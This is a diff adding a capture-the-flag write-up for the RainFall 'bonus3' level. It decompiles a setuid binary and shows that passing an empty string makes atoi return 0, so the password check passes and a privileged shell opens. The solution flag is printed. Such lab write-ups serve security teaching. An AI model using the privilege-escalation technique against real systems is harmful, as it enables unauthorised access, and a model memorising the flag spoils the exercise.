@@ -6,3 +6,107 @@
 => It works
 
 ./bonus3 ""
+
+
+# Bonus 3
+
+## General Informations 
+
+**Path** : `/home/user/bonus3/bonus3` </br>
+**File** : 
+```
+bonus3: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x530d693450de037e44d1186904401c8f8064874b, not stripped
+```
+**Permissions**: `-rwsr-s---+ 1 end users 5595 Mar  6  2016 bonus3`
+
+## Static Analysis
+
+After decompiling the binary in ghidra, we get the pseudo code below: 
+
+```
+undefined4 main(int param_1,int param_2)
+{
+  undefined4 uVar1;
+  int iVar2;
+  char *pcVar3;
+  byte bVar4;
+  char local_98 [65];
+  undefined1 local_57;
+  char local_56 [66];
+  FILE *local_14;
+  
+  bVar4 = 0;
+  local_14 = fopen("/home/user/end/.pass","r");
+  pcVar3 = local_98;
+  for (iVar2 = 0x21; iVar2 != 0; iVar2 = iVar2 + -1) {
+    pcVar3[0] = '\0';
+    pcVar3[1] = '\0';
+    pcVar3[2] = '\0';
+    pcVar3[3] = '\0';
+    pcVar3 = pcVar3 + ((uint)bVar4 * -2 + 1) * 4;
+  }
+  if ((local_14 == (FILE *)0x0) || (param_1 != 2)) {
+    uVar1 = 0xffffffff;
+  }
+  else {
+    fread(local_98,1,0x42,local_14);
+    local_57 = 0;
+    iVar2 = atoi(*(char **)(param_2 + 4));
+    local_98[iVar2] = '\0';
+    fread(local_56,1,0x41,local_14);
+    fclose(local_14);
+    iVar2 = strcmp(local_98,*(char **)(param_2 + 4));
+    if (iVar2 == 0) {
+      execl("/bin/sh","sh",0);
+    }
+    else {
+      puts(local_56);
+    }
+    uVar1 = 0;
+  }
+  return uVar1;
+}
+```
+
+`main`
+  - Opens the .pass file, checks for errors, and ensures exactly one argument is provided
+  - Reads the content of the file into the `local_68` buffer
+  - Calls `atoi` on the first argument and uses the result to place a null terminator `\0` in the pass buffer
+  - Closes the file
+  - Then the interesting part: the pass buffer is then compared to the first argument. If both buffers are equal, a shell is executed
+
+The **man** of `atoi` gives us an interesting information:
+```
+...
+RETURN VALUE        
+       The converted value or 0 on error.
+```
+
+The first edge case that comes to mind is passing an empty string `""` as an argument. </br>
+In that case, `atoi` returns 0, so the program places a null terminator at the beginning of the pass buffer (index 0), making it an empty string.
+And since our argument is also an empty string, the comparison between the two succeeds.
+```
+bonus3@RainFall:~$ ./bonus3 ""
+$ 
+```
+It works !
+
+## Vulnerability found 
+
+## Dynamic Analysis
+
+## Payload construction 
+
+## Demonstration 
+
+```
+bonus3@RainFall:~$ ./bonus3 ""
+$ whoami
+end
+```
+
+## Flag 
+
+```
+3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
+```
